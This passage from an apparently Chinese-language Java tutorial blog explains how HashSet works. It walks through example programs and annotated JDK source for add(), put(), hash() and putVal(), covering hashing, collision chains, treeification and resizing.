java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashSet01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"></span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;卡卡西&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;佐助&quot;</span>));  <span class="comment">// true</span></span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;鸣人&quot;</span>));  <span class="comment">// true</span></span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;佐助&quot;</span>));  <span class="comment">// false</span></span><br><span class="line">        System.out.println(set.add(<span class="string">&quot;博人&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        set.remove(<span class="string">&quot;佐助&quot;</span>);</span><br><span class="line">        System.out.println(set);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        set = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"><span class="comment">//        hashSet 不能添加相同的元素/数据</span></span><br><span class="line">        set.add(<span class="string">&quot;lucy&quot;</span>);  <span class="comment">// true</span></span><br><span class="line">        set.add(<span class="string">&quot;lucy&quot;</span>);  <span class="comment">// false</span></span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;tom&quot;</span>));  <span class="comment">//true</span></span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;tom&quot;</span>));  <span class="comment">//true</span></span><br><span class="line">        System.out.println(set);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        经典面试题</span></span><br><span class="line">        <span class="comment">// String类 相同字符的hash值结果一样，equals也为true,可见源码</span></span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;wkliu&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;wkliu&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">        System.out.println(set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Dog&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HashSet-底层机制"><a href="#HashSet-底层机制" class="headerlink" title="HashSet 底层机制"></a>HashSet 底层机制</h3><p>HashSet 底层是HashMap，HashMap底层是（数组+链表+红黑树）</p><p>模拟底层简单结构<br>结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;all&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashSetStructure</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        模拟 HashSet 的底层 即HashMap底层</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        1. 创建一个数组，数组的类型是Node</span></span><br><span class="line">        Node[] table = <span class="keyword">new</span> <span class="title class_">Node</span>[<span class="number">16</span>];</span><br><span class="line">        System.out.println(<span class="string">&quot;table=&quot;</span>+table);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        2. 创建节点</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">john</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="string">&quot;john&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        table[<span class="number">2</span>] = john;</span><br><span class="line"></span><br><span class="line">        <span class="type">Node</span> <span class="variable">jack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="string">&quot;jack&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//        将jack节点挂载到 john后</span></span><br><span class="line">        john.next = jack;</span><br><span class="line"></span><br><span class="line">        <span class="type">Node</span> <span class="variable">rose</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="string">&quot;rose&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//        将rose节点挂载到jack后</span></span><br><span class="line">        jack.next = rose;</span><br><span class="line"></span><br><span class="line">        <span class="type">Node</span> <span class="variable">lucy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="string">&quot;lucy&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//        把lucy放到 table数组索引为3的位置</span></span><br><span class="line">        table[<span class="number">3</span>] = lucy;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;table=&quot;</span>+table);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//节点，存储数据，可以指向下一个节点，从而形成链表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    Object item; <span class="comment">//存放数据</span></span><br><span class="line">    Node next;   <span class="comment">// 指向下一个节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(Object item, Node next)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.item = item;</span><br><span class="line">        <span class="built_in">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashSet add()方法底层</p><ol><li>HashSet 底层是 HashMap</li><li>添加一个元素时，先得到hash值 会转成 -&gt; 索引值</li><li>找到存储数据表table，看这个索引位置是否已经存放的有元素</li><li>如果没有，直接加入</li><li>如果有，调用 equals() 比较， 如果相同，就放弃添加，如果不相同，则添加到最后</li><li>在 java8 中，如果一条链表的元素个数 &gt;&#x3D; TREEIFY_THRESHOLD（默认是8），并且table的大小 &gt;&#x3D; MIN_TREEIFY_CAPCAITY（默认64），就会进行树化（红黑树）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;all&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashSetSource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"></span><br><span class="line">        hashSet.add(<span class="string">&quot;java&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;pp&quot;</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;java&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;haseSet=&quot;</span>+hashSet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一次add() “JAVA”</strong><br>创建hashset对象，构造器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructs a new, empty set; the backing &lt;tt&gt;HashMap&lt;/tt&gt; instance has</span></span><br><span class="line"><span class="comment"> * default initial capacity (16) and load factor (0.75).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HashSet</span><span class="params">()</span> &#123;</span><br><span class="line">    map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行add()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Adds the specified element to this set if it is not already present.</span></span><br><span class="line"><span class="comment"> * More formally, adds the specified element &lt;tt&gt;e&lt;/tt&gt; to this set if</span></span><br><span class="line"><span class="comment"> * this set contains no element &lt;tt&gt;e2&lt;/tt&gt; such that</span></span><br><span class="line"><span class="comment"> * &lt;tt&gt;(e==null&amp;nbsp;?&amp;nbsp;e2==null&amp;nbsp;:&amp;nbsp;e.equals(e2))&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> * If this set already contains the element, the call leaves the set</span></span><br><span class="line"><span class="comment"> * unchanged and returns &lt;tt&gt;false&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> e element to be added to this set</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &lt;tt&gt;true&lt;/tt&gt; if this set did not already contain the specified</span></span><br><span class="line"><span class="comment"> * element</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;    <span class="comment">// e:&quot;java&quot;</span></span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;  <span class="comment">//e:&quot;java&quot; map:&quot;&#123;&#125;&quot;  (static) PRESENT =  new Object</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行put()方法，该方法会执行hash(key)方法，得到key对应的hash值（不是hashcode，通过算法计算hash值，降低hash冲突的几率）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Associates the specified value with the specified key in this map.</span></span><br><span class="line"><span class="comment"> * If the map previously contained a mapping for the key, the old</span></span><br><span class="line"><span class="comment"> * value is replaced.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key key with which the specified value is to be associated</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value value to be associated with the specified key</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the previous value associated with &lt;tt&gt;key&lt;/tt&gt;, or</span></span><br><span class="line"><span class="comment"> *         &lt;tt&gt;null&lt;/tt&gt; if there was no mapping for &lt;tt&gt;key&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *         (A &lt;tt&gt;null&lt;/tt&gt; return can also indicate that the map</span></span><br><span class="line"><span class="comment"> *         previously associated &lt;tt&gt;null&lt;/tt&gt; with &lt;tt&gt;key&lt;/tt&gt;.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;   <span class="comment">// key:&quot;java&quot;  value:PRESENT/Object@502</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>); <span class="comment">// key:&quot;java&quot;  value:PRESENT/Object@502</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hash(key)方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Computes key.hashCode() and spreads (XORs) higher bits of hash</span></span><br><span class="line"><span class="comment"> * to lower.  Because the table uses power-of-two masking, sets of</span></span><br><span class="line"><span class="comment"> * hashes that vary only in bits above the current mask will</span></span><br><span class="line"><span class="comment"> * always collide. (Among known examples are sets of Float keys</span></span><br><span class="line"><span class="comment"> * holding consecutive whole numbers in small tables.)  So we</span></span><br><span class="line"><span class="comment"> * apply a transform that spreads the impact of higher bits</span></span><br><span class="line"><span class="comment"> * downward. There is a tradeoff between speed, utility, and</span></span><br><span class="line"><span class="comment"> * quality of bit-spreading. Because many common sets of hashes</span></span><br><span class="line"><span class="comment"> * are already reasonably distributed (so don&#x27;t benefit from</span></span><br><span class="line"><span class="comment"> * spreading), and because we use trees to handle large sets of</span></span><br><span class="line"><span class="comment"> * collisions in bins, we just XOR some shifted bits in the</span></span><br><span class="line"><span class="comment"> * cheapest possible way to reduce systematic lossage, as well as</span></span><br><span class="line"><span class="comment"> * to incorporate impact of the highest bits that would otherwise</span></span><br><span class="line"><span class="comment"> * never be used in index calculations because of table bounds.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>); <span class="comment">// &gt;&gt;&gt; 无符号右移16位，降低hash冲突的几率</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>putVal()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implements Map.put and related methods.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> hash hash for key</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key the key</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value to put</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> onlyIfAbsent if true, don&#x27;t change existing value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> evict if false, the table is in creation mode.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> previous value, or null if none</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">               <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义辅助变量 tab、p、n、i</span></span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// table 是hashMap的一个属性，类型是Node[]  存放 node节点的数组</span></span><br><span class="line">    <span class="comment">// 如果 table为null或者大小为0，执行resize()方法，table第一次扩容16个空间</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1)根据key得到的hash 计算该key应该存放到tab表的哪个索引位置，</span></span><br><span class="line">    <span class="comment">//    并且把这个位置变量赋给辅助变量p</span></span><br><span class="line">    <span class="comment">// (2) 判断 p 是否为null</span></span><br><span class="line">    <span class="comment">//     如果p为null,表示还没有存放元素，就创建一个Node key=&quot;java&quot;,value=PRESENT</span></span><br><span class="line">    <span class="comment">//     将该Node存入tab中: tab[i] = newNode(hash, key, value, null);</span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 操作次数</span></span><br><span class="line">    ++modCount;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否需要扩容，threshold为扩容操作临界值，默认为12，tab超过12执行扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//空方法，是HashMap 给其子类留的 让其子类执行一些操作</span></span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 放回 null,代表成功</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第二次add() “PHP”</strong><br>putVal()方法和第一次一样，只不过未进行扩容操作</p><p><strong>第三次add()相同元素”JAVA”</strong><br>putVal()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第三次添加，table表不为空，不执行if</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// (1)根据key得到的hash 计算该key应该存放到tab表的哪个索引位置，</span></span><br><span class="line">        <span class="comment">//    并且把这个位置变量赋给辅助变量p</span></span><br><span class="line">        <span class="comment">// (2) 判断 p 是否为null</span></span><br><span class="line">    <span class="comment">//     此时p 不为null,执行else方法</span></span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">            tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// 定义辅助变量。开发技巧：在需要局部变量（辅助变量）时候，再创建</span></span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//p.hash == hash：如果当前索引位置对应的链表的第一个元素和准备添加的key的hash值相同</span></span><br><span class="line">            <span class="comment">// 并且满足下面两个条件之一：</span></span><br><span class="line">            <span class="comment">//1.(k = p.key) == key: 准备加入的key 和 p 指向的Node节点的key 是同一个对象</span></span><br><span class="line">            <span class="comment">//2.(key != null &amp;&amp; key.equals(k))) 当前key不为null与 p指向Node结点的key的equals() 和准备加入的key比较后相同</span></span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;  </span><br><span class="line">                ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 判断 p 是否为 红黑树</span></span><br><span class="line">            <span class="comment">// 如果是红黑树 调用putTreeVal()方法追加</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果table对应的索引位置已经是一个链表，使用for循环比较</span></span><br><span class="line">                <span class="comment">// 1. 依次和该链表的每一个元素比较后，都不相同，则加入到该链表的最后</span></span><br><span class="line">                <span class="comment">//      在把元素添加到链表后，立即判断，该链表是否已经达到8个节点，如果达到就调用treeifyBin()对当前链表进行树化，转成红黑树</span></span><br><span class="line">                <span class="comment">//在转成红黑树时，要进行判断，如果该table数组的大小小于64，先对table表扩容，判断不成立才进行红黑树转化</span></span><br><span class="line">                <span class="comment">// 2. 在依次比较的过程中，如果有相同的元素，直接break </span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++modCount;</span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>HashSet 的扩容和转成红黑树机制</strong></p><ol><li>HashSet 底层是HashMap，第一次添加时，table数组扩容到16，临界值（threshold）是 